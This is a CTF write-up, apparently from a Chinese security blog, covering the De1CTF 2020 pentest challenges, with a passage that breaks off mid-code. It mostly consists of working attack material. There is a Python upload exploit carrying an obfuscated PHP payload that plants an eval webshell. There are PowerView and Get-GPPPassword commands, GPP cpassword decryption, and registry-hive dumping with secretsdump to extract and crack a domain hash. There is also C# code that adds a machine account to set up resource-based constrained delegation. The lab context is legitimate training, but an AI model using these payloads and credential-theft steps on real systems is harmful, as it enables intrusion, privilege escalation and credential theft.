<p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505">https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505</a></p>
<p><a href="https://github.com/taviso/rbndr/">https://github.com/taviso/rbndr/</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>De1tactf2020 pentest非预期解与预期解</title>
    <url>/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/</url>
    <content><![CDATA[<!-- 把一些停留在理论认知上的高级攻击姿势全部操练了一遍，学到很多。 -->
<!-- more -->
<h2 id="pentest1">pentest1</h2>
<p>先是一个有绕过的文件上传，这部分是其他小伙伴做的直接给exp了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.113.219.76/index.php&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=----WebKitFormBoundaryhJUhA4FiLizuakBx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">&quot;&quot;&quot;------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx--&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$___=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$________=$_?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$________=&#x27;_&#x27;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$_________=$__.$___.$__.$____.$_____.$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__________=$________.$_______.$_____.$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________=$$__________?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________[_]($____________________[__],$____________________[___])?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data=data.<span class="built_in">format</span>(<span class="string">&quot;syc.pHp&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">filename=re.search(<span class="string">&quot;in:(uploads/.*)&quot;</span>,r.text).group(<span class="number">1</span>)</span><br><span class="line">filename=filename.strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;http://47.113.219.76/&quot;</span>+filename)</span><br><span class="line">r=requests.get(<span class="string">&quot;http://47.113.219.76/&quot;</span>+filename+<span class="string">&quot;?_=file_put_contents&amp;__=1.php&amp;___=&lt;?php eval($_POST[a]);?&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>打完访问对应目录是下的1.php，密码是a。</p>
<p>连上webshell后把shell反弹到cs上，使用powerview进行信息收集可以看到，域内共享有一个hint。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/wintool/PowerView<span class="literal">-dev</span>.ps1</span><br><span class="line">powershell <span class="built_in">get-domaincomputer</span>|<span class="built_in">get-netshare</span></span><br></pre></td></tr></table></figure>
<p><img src="1588571307111-5e34ec2e-3746-4588-a39a-10f3a9f63a25.png#align=left&amp;display=inline&amp;height=370&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=740&amp;originWidth=1972&amp;size=170863&amp;status=done&amp;style=none&amp;width=986" alt="image.png"><br>
查看这个Hint可以发现，有一个拿flag的tip。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\dc.De1CTF2020.lab\Hin</span><br></pre></td></tr></table></figure>
<p><img src="1588571461665-c690928a-3e23-45b0-a976-6085f19c8b8c.png#align=left&amp;display=inline&amp;height=294&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=516&amp;originWidth=1310&amp;size=89949&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
把提示拷贝下来下载发现这个zip需要密码才能打开。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> \\dc.De1CTF2020.lab\Hint\flag1_and_flag2hint.zip .</span><br></pre></td></tr></table></figure>
<p><img src="1588571579651-4a3a8b66-d1f2-45fd-a1f5-0f3ece8c3806.png#align=left&amp;display=inline&amp;height=128&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=240&amp;originWidth=1394&amp;size=41584&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1588571632020-37b1afd9-feb0-418c-ad5d-1c4498fd8e69.png#align=left&amp;display=inline&amp;height=232&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=228&amp;originWidth=734&amp;size=162224&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>接着收集，域内用户信息发现有一个可疑用户。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">shell net user /dom</span><br></pre></td></tr></table></figure>
<p><img src="1588571706287-81a8ed6d-3616-4d15-8bf5-71f73ddd2ab0.png#align=left&amp;display=inline&amp;height=278&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=512&amp;originWidth=1372&amp;size=69925&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
猜测HintZip_Pass账户密码就是解压缩的密码。这里经过一些尝试之后考虑会不会是gpp尝试ps直接导出，发现爆了个错，看意思是说当前用户不是domain user（客观事实是当前账户就是域用户）。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line">powershell <span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure>
<p><img src="1588572573067-016fb792-b6b8-4668-bcf1-867cd7c903d6.png#align=left&amp;display=inline&amp;height=264&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=528&amp;originWidth=3320&amp;size=219484&amp;status=done&amp;style=none&amp;width=1660" alt="image.png"><br>
也不会改powershell，就直接手动遍历SYSVOL了（还好不是很多，多的话建议弹到msf上用msf的脚本搞）<br>
<img src="1588572660278-a2470a51-0660-40e9-84db-f27631fd0de1.png#align=left&amp;display=inline&amp;height=165&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=330&amp;originWidth=3098&amp;size=139547&amp;status=done&amp;style=none&amp;width=1549" alt="image.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;&lt;User clsid=<span class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> name=<span class="string">&quot;HintZip_Pass&quot;</span> image=<span class="string">&quot;2&quot;</span> changed=<span class="string">&quot;2020-04-15 14:43:23&quot;</span> uid=<span class="string">&quot;&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;&quot;</span>&gt;&lt;Properties action=<span class="string">&quot;U&quot;</span> newName=<span class="string">&quot;&quot;</span> fullName=<span class="string">&quot;&quot;</span> description=<span class="string">&quot;&quot;</span> cpassword=<span class="string">&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</span> changeLogon=<span class="string">&quot;1&quot;</span> noChange=<span class="string">&quot;0&quot;</span> neverExpires=<span class="string">&quot;0&quot;</span> acctDisabled=<span class="string">&quot;0&quot;</span> userName=<span class="string">&quot;HintZip_Pass&quot;</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gpp<span class="literal">-decrypt</span> uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+<span class="number">08</span></span><br></pre></td></tr></table></figure>
<p><img src="1588572802371-89b2b0bb-448d-4a90-bf15-98e33fc1aeb7.png#align=left&amp;display=inline&amp;height=57&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=114&amp;originWidth=1560&amp;size=30614&amp;status=done&amp;style=none&amp;width=780" alt="image.png"><br>
用zL1PpP@sSwO3d解密刚才的压缩包flag1_and_flag2hint.zip即可得到，第一个flag和下一关的提示。<br>
<img src="1588573070964-1b84f5a1-acb3-4953-9c2d-73178a7d1f04.png#align=left&amp;display=inline&amp;height=212&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=424&amp;originWidth=1910&amp;size=215139&amp;status=done&amp;style=none&amp;width=955" alt="image.png"></p>
<h2 id="pentest2">pentest2</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&#x27;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure>
<p>从提示可以看出来，出题的思路是，通过某种离线爆破的方法拿到De1ta密码，De1ta用户存在acl滥用问题以至于可以搞到域控拿下读到C:\Users\Administrator\Desktop\flag.txt。</p>
<p>关于如何离线爆破我这里是非预期，之前服务器web账号有特权可以juicypotato提权。<br>
<img src="1588573565560-9d6716f9-d32b-4eb5-9a9c-91711b04a197.png#align=left&amp;display=inline&amp;height=170&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=340&amp;originWidth=1518&amp;size=164466&amp;status=done&amp;style=none&amp;width=759" alt="image.png"><br>
我一直没成功。<br>
<img src="1588573783800-0db2592f-a2cd-4c5f-9cdd-4ca11d0cf248.png#align=left&amp;display=inline&amp;height=143&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=286&amp;originWidth=2938&amp;size=333395&amp;status=done&amp;style=none&amp;width=1469" alt="image.png"><br>
当时有其他师傅成功，给我弹了个system shell。<br>
<img src="1588573859200-550561f7-5f5a-4a84-a1fa-e13ccac3ada6.png#align=left&amp;display=inline&amp;height=850&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1700&amp;originWidth=2336&amp;size=1034458&amp;status=done&amp;style=none&amp;width=1168" alt="image.png"><br>
导出De1ta账户的mscach</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">python secretsdump.py -security /Users/cengsiqi/Desktop/hash/security.hive -system /Users/cengsiqi/Desktop/hash/SYSTEM.hive LOCAL</span><br></pre></td></tr></table></figure>
<p><img src="1588574718180-d11b9ed0-667b-4ae6-99e4-e01193c87746.png#align=left&amp;display=inline&amp;height=475&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=950&amp;originWidth=1648&amp;size=236880&amp;status=done&amp;style=none&amp;width=824" alt="image.png"><br>
可以拿到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DE1CTF2020.LAB/De1ta:$DCC2$10240#De1ta#52c2cfff23d879a2ba830cf184c10b46</span><br></pre></td></tr></table></figure>
<p>根据提示的密码复杂度，用hascat跑出来结果是3f23ea12。</p>
<p>密码有了下一步根据提示来Delta acl滥用问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell-import /Users/cengsiqi/Desktop/pentest/wintool/PowerView-master.ps1</span><br><span class="line">powershell Get-ObjectAcl -Domain De1CTF2020.lab -ResolveGUIDs|?&#123;$_.IdentityReference -eq &quot;DE1CTF2020\De1ta&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>输出出来了很多东西重点关注两个地方，第一个地方是De1ta的ExtendedRight让他具备Dcshadow的攻击的能力。<br>
<img src="1588575673500-53352e9a-aeb4-4e14-9ad0-b26a863c9020.png#align=left&amp;display=inline&amp;height=677&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1354&amp;originWidth=1986&amp;size=264009&amp;status=done&amp;style=none&amp;width=993" alt="image.png"></p>
<p><img src="1588575717063-9f145c16-c35c-42f5-a0e6-e5324a265a61.png#align=left&amp;display=inline&amp;height=780&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1560&amp;originWidth=2814&amp;size=306391&amp;status=done&amp;style=none&amp;width=1407" alt="image.png"></p>
<p>通过查阅资料可以知道Dcshadow攻击时需要De1ta这种特权账号和一个SYSTEM账号。做到这里的时候juciypotato已经修了，之前抓的administrator hash也改了。（<strong>经验不丰富，如果之前抓了机器hash也能提权了</strong>）。</p>
<p>接下来就需要关注第二个地方了。De1ta用户对DM机器具有WriteProperty，环境又是12，所以可以用烂番茄提权。<br>
<img src="1588581133347-61181c79-d803-4958-8961-9ffbcfcbd06d.png#align=left&amp;display=inline&amp;height=218&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=436&amp;originWidth=1468&amp;size=81567&amp;status=done&amp;style=none&amp;width=734" alt="image.png"></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Security.AccessControl;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Addnew_MachineAccount</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            String DomainController = <span class="string">&quot;192.168.0.12&quot;</span>;</span><br><span class="line">            String Domain = <span class="string">&quot;De1CTF2020.lab&quot;</span>;</span><br><span class="line">            String new_MachineAccount = <span class="string">&quot;lisan4&quot;</span>; <span class="comment">//添加的机器账户</span></span><br><span class="line">            String new_MachineAccount_password = <span class="string">&quot;sycl0ver&quot;</span>; <span class="comment">//机器账户密码</span></span><br><span class="line">            String victimcomputer = <span class="string">&quot;DM&quot;</span>; <span class="comment">//需要进行提权的机器</span></span><br><span class="line">            String victimcomputer_ldap_path = <span class="string">&quot;LDAP://CN=DM,CN=Computers,DC=De1CTF2020,DC=lab&quot;</span>;</span><br><span class="line">            String machine_account = new_MachineAccount;</span><br><span class="line">            String sam_account = machine_account + <span class="string">&quot;$&quot;</span>;</span><br><span class="line"></span><br><span class="line">            String distinguished_name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            String[] DC_array = <span class="literal">null</span>;</span><br><span class="line">            distinguished_name = <span class="string">&quot;CN=&quot;</span> + machine_account + <span class="string">&quot;,CN=Computers&quot;</span>;</span><br><span class="line">            DC_array = Domain.Split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (String DC <span class="keyword">in</span> DC_array)</span><br><span class="line">            &#123;</span><br><span class="line">                distinguished_name += <span class="string">&quot;,DC=&quot;</span> + DC;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;[+] Elevate permissions on &quot;</span> + victimcomputer);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;[+] Domain = &quot;</span> + Domain);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;[+] Domain Controller = &quot;</span> + DomainController);</span><br><span class="line">            <span class="comment">//Console.WriteLine(&quot;[+] New SAMAccountName = &quot; + sam_account);</span></span><br><span class="line">            <span class="comment">//Console.WriteLine(&quot;[+] Distinguished Name = &quot; + distinguished_name);</span></span><br><span class="line">            <span class="comment">//连接ldap</span></span><br><span class="line">            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, <span class="number">389</span>);</span><br><span class="line">            <span class="comment">//NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录            </span></span><br><span class="line"></span><br><span class="line">            System.DirectoryServices.Protocols.LdapConnection connection = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);</span></span><br><span class="line">            connection = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapConnection(identifier);</span><br><span class="line">            connection.SessionOptions.Sealing = <span class="literal">true</span>;</span><br><span class="line">            connection.SessionOptions.Signing = <span class="literal">true</span>;</span><br><span class="line">            connection.Bind();</span><br><span class="line">            <span class="keyword">var</span> request = <span class="keyword">new</span> System.DirectoryServices.Protocols.AddRequest(distinguished_name, <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute[] &#123;</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">&quot;DnsHostName&quot;</span>, machine_account +<span class="string">&quot;.&quot;</span>+ Domain),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">&quot;SamAccountName&quot;</span>, sam_account),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">&quot;userAccountControl&quot;</span>, <span class="string">&quot;4096&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">&quot;unicodePwd&quot;</span>, Encoding.Unicode.GetBytes(<span class="string">&quot;\&quot;&quot;</span> + new_MachineAccount_password + <span class="string">&quot;\&quot;&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;Computer&quot;</span>),</span><br><span class="line">               <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">&quot;ServicePrincipalName&quot;</span>, <span class="string">&quot;HOST/&quot;</span>+machine_account+<span class="string">&quot;.&quot;</span>+Domain,<span class="string">&quot;RestrictedKrbHost/&quot;</span>+machine_account+<span class="string">&quot;.&quot;</span>+Domain,<span class="string">&quot;HOST/&quot;</span>+machine_account,<span class="string">&quot;RestrictedKrbHost/&quot;</span>+machine_account)</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//添加机器账户</span></span><br><span class="line">                connection.SendRequest(request);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;[+] Machine account: &quot;</span> + machine_account + <span class="string">&quot; Password: &quot;</span> + new_MachineAccount_password + <span class="string">&quot; added&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;[-] Exception: &quot;</span> + ex.Message);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 获取新计算机对象的SID</span></span><br><span class="line">            <span class="keyword">var</span> new_request = <span class="keyword">new</span> System.DirectoryServices.Protocols.SearchRequest(distinguished_name, <span class="string">&quot;(&amp;(samAccountType=805306369)(|(name=&quot;</span> + machine_account + <span class="string">&quot;)))&quot;</span>, System.DirectoryServices.Protocols.SearchScope.Subtree, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">var</span> new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);</span><br><span class="line">            SecurityIdentifier sid = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (System.DirectoryServices.Protocols.SearchResultEntry entry <span class="keyword">in</span> new_response.Entries)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sid = <span class="keyword">new</span> SecurityIdentifier(entry.Attributes[<span class="string">&quot;objectsid&quot;</span>][<span class="number">0</span>] <span class="keyword">as</span> <span class="built_in">byte</span>[], <span class="number">0</span>);</span><br><span class="line">                    Console.Out.WriteLine(<span class="string">&quot;[+] &quot;</span> + new_MachineAccount + <span class="string">&quot; SID : &quot;</span> + sid.Value);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;[!] It was not possible to retrieve the SID.\nExiting...&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置资源约束委派</span></span><br><span class="line">            System.DirectoryServices.DirectoryEntry myldapConnection = <span class="keyword">new</span> System.DirectoryServices.DirectoryEntry(<span class="string">&quot;De1CTF2020.lab&quot;</span>,<span class="string">&quot;De1ta&quot;</span>, <span class="string">&quot;3f23ea12&quot;</span>);</span><br><span class="line"></span><br><span class="line">            myldapConnection.Path = victimcomputer_ldap_path;</span><br><span class="line"></span><br><span class="line">            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;</span><br><span class="line">            System.DirectoryServices.DirectorySearcher search = <span class="keyword">new</span> System.DirectoryServices.DirectorySearcher(myldapConnection);</span><br><span class="line">            <span 